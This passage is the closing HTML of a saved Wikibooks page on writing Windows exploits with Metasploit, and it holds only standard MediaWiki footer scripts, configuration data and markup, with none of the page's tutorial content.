						<div style="clear:both"></div>
		</div>
		<!-- /footer -->
		<script type="text/javascript">if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.legacy.wikibits", "mediawiki.util", "mediawiki.legacy.ajax", "mediawiki.legacy.mwsuggest", "ext.vector.collapsibleNav", "ext.vector.collapsibleTabs", "ext.vector.editWarning", "ext.vector.simpleSearch"]);
	mediaWiki.loader.go();
}
</script><script type="text/javascript" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load(4).php"></script><script type="text/javascript" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load(5).php"></script>

<script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/flaggedrevs.js" type="text/javascript"></script>
<script type="text/javascript">
FlaggedRevs.messages = {"diffToggleShow": "show those changes", "diffToggleHide": "hide those changes", "logToggleShow": "show stability log", "logToggleHide": "hide stability log", "logDetailsShow": "show details", "logDetailsHide": "hide details", "toggleShow": "(+)", "toggleHide": "(-)"};
</script>
<script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/readerfeedback.js" type="text/javascript"></script>
<script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/index(18).php" type="text/javascript"></script>
<script src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/load(6).php" type="text/javascript"></script>
<script type="text/javascript">if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":false,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":4,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":1,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":"3","watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"flaggedrevssimpleui":0,"flaggedrevsstable":false,"flaggedrevseditdiffs":true,"flaggedrevsviewdiffs":false,"vector-simplesearch":1,"useeditwarning":1,"vector-collapsiblenav":1,"usebetatoolbar":1,"usebetatoolbar-cgd":1,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":true,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false,"searchNs102":false,"searchNs103":false,"searchNs108":false,"searchNs109":false,"searchNs110":false,"searchNs111":false,"searchNs112":true,"searchNs113":false});;mediaWiki.loader.state({"user.options":"ready"});
	
	/* cache key: enwikibooks:resourceloader:filter:minify-js:5:6a1a5c7907cffcc8c58c4ac1ab4a7c3d */
}
</script><script type="text/javascript" src="./Metasploit WritingWindowsExploit - Wikibooks, open books for an open world_files/saved_resource"></script>		<!-- fixalpha -->
		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
		<!-- /fixalpha -->
		<!-- Served by srv264 in 0.160 secs. -->			

<div style="top: 71px; width: 203px; display: none; left: auto; right: 30px; " class="suggestions"><div class="suggestions-results"></div><div class="suggestions-special"></div></div></body></html>